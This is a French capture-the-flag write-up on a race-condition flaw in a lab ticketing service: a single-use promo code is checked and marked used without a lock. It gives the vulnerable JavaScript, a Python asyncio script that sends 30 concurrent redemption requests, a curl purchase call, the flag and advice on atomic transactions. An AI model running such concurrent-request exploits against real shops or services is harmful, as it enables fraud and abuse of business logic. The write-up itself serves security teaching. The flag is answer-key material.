# Write-up — Défi 4 : La Bombe Logique Asynchrone

**Catégorie** : Programmation / Concurrence (DevOps)  
**Niveau** : Expert  
**Flag** : `CTF{r4c3_c0nd1t10n_v4l1d4t3d}`  
**Commande de départ** : `curl http://<IP>:5003` ou navigateur

---

## Contexte

Un service de billetterie en ligne. Le joueur a 50 crédits, le billet VIP coûte 500 crédits. Un code promo `ONE_TIME_100` à usage unique ajoute 100 crédits. La vulnérabilité : absence de verrou lors de l'accès à la base de données — **Race Condition**.

---

## La faille

```javascript
// 1. Vérification (lecture)
const promo = db.get('SELECT * FROM promos WHERE code = ?', [promoCode]);
if (promo.used === 1) return res.status(400).json({ error: 'Déjà utilisé !' });

// ⚠️ FENÊTRE DE 150ms — N requêtes concurrentes passent toutes ici

// 2. Mise à jour (écriture)
db.run('UPDATE promos SET used = 1 WHERE code = ?', [promoCode]);
db.run('UPDATE users SET balance = balance + 100 WHERE id = ?', [userId]);
```

Si on envoie 30 requêtes simultanées, toutes passent la vérification avant que la première mise à jour soit enregistrée → le code promo est crédité 30 fois = **3000 crédits**.

---

## Étapes de résolution

### 1. Récupérer sa session

Visiter `http://<IP>:5003/` et récupérer le cookie de session via les outils développeur (F12 → Application → Cookies → `connect.sid`).

### 2. Script d'exploitation (Python asyncio)

```python
import asyncio
import aiohttp

URL = "http://<IP>:5003/api/v1/buy-ticket"
COOKIES = {"connect.sid": "VOTRE_SESSION_ICI"}
PAYLOAD = {"promoCode": "ONE_TIME_100"}

async def send_request(session):
    async with session.post(URL, data=PAYLOAD, cookies=COOKIES) as r:
        return await r.json()

async def main():
    async with aiohttp.ClientSession() as session:
        tasks = [send_request(session) for _ in range(30)]
        results = await asyncio.gather(*tasks)
        for i, r in enumerate(results):
            print(f"Requête {i}: {r}")

asyncio.run(main())
```

### 3. Acheter le billet VIP

Après l'exploit, le solde dépasse 500 crédits. Accéder à `/` et cliquer sur "Acheter Billet VIP" ou :

```bash
curl -X POST http://<IP>:5003/api/v1/buy-vip \
  --cookie "connect.sid=VOTRE_SESSION"
```

Réponse : `{"flag":"CTF{r4c3_c0nd1t10n_v4l1d4t3d}"}`

---

## Vulnérabilité expliquée

Absence de transaction atomique ou de verrou entre la lecture et l'écriture en base de données.

**Remédiation** : Utiliser des transactions atomiques (`BEGIN TRANSACTION / COMMIT`) ou un verrou applicatif (`mutex`).
